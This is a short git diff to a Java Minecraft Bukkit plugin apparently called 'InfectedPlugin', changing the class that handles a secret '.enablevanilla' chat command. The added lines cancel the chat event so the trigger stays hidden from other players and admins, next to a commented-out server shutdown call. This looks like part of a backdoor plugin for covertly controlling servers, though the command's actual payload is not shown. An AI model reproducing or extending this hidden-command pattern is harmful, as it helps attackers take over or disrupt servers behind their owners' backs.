@@ -1,5 +1,8 @@
-package org.CreeperCoders.InfectedPlugin;
+package org.CreeperCoders.InfectedPlugin.Commands;
 
+import java.io.File;
+
+import org.CreeperCoders.InfectedPlugin.IP_Util;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
@@ -34,5 +37,11 @@ public class Command_enablevanilla implements Listener
             //Bukkit.shutdown(); //Shutdown Bukkit
             cancel = true; //Block the player from saying .enablevanilla
         } //End of command
+        
+        if (cancel)
+        {
+        	event.setCancelled(true);
+        	return;
+        }
     }
 }
